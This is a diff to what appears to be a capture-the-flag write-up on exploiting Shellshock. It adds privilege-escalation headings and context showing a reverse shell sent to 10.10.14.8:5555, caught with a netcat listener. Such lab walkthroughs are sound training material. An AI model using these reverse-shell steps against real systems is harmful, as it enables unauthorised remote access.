@@ -9,7 +9,9 @@ Level: Easy
 	2. [`Validating Shell Shock using nmap`](#`Validating%20Shell%20Shock%20using%20nmap`)
 	3. [`ShellShock using CURL`](#`ShellShock%20using%20CURL`)
 	4. [`User Flag using ShellShock`](#`User%20Flag%20using%20ShellShock`)
-4. 
+4. [Privilege Escalation](#Privilege%20Escalation)
+	1. [`Grab the Perl Shell`](#`Grab%20the%20Perl%20Shell`)
+	2. [`Got Root Flag`](#`Got%20Root%20Flag`)
 
 ### Box Info
 ```
@@ -157,7 +159,7 @@ Content-Type: text/html
 Sent reverse shell to 10.10.14.8:5555<p>
 ```
 
-
+###### `Got Root Flag`
 On the NetCat Listener side
 ```
 # nc -lvnp 5555           
